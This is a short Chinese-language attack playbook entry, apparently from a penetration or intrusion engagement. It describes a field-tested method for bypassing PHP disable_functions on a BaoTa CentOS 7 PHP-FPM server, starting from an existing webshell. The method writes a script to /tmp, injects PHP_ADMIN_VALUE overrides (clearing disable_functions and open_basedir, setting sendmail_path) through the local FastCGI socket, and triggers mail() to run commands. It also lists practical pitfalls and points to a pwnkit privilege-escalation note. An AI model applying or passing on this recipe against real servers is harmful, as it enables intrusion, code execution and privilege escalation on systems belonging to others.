# PHP-FPM Unix sock + sendmail_path RCE（disable_functions 下）

实战：宝塔 CentOS7 / PHP 7.2 fpm-fcgi（国强利民 2026-10-05）。

## 前置

- 已有任意文件写（webshell / 装机写 public）。
- `disable_functions` 含 system/exec/shell_exec/passthru/proc_open/popen/putenv。
- `mail` 仍可用；普通请求里 `ini_set('sendmail_path')` 常失败（PHP_ADMIN 锁）。
- sock：`/tmp/php-cgi-72.sock`；`listen.mode=0666` → 可本地 FastCGI 连。

## 步骤

1. 写 `/tmp/hcmd.sh`（绝对 PATH、命令重定向到 `/tmp/hcmd_out.txt`），`chmod 755`。
2. 写探针 PHP：`mail("a@b.c","s","b"); echo file_get_contents("/tmp/hcmd_out.txt");`
3. FastCGI 连 sock，PARAMS：`SCRIPT_FILENAME` + `PHP_ADMIN_VALUE`：
   ```
   disable_functions=
   open_basedir=
   sendmail_path=/tmp/hcmd.sh
   ```
4. 触发 mail → 读 out 文件见 `uid=…(www)`。

## 坑

- `sendmail_path=/bin/bash -c "…"` → bash `-d: invalid option`（参数被拆）。
- 只清空 DF 字符串 **不会** 恢复已禁用函数；继续用 mail 原语。
- FCGI 子进程 PATH 可能空 → 脚本内用 `/usr/bin` 等绝对路径。

提权：`references/pwnkit-berdav-centos7.md`。
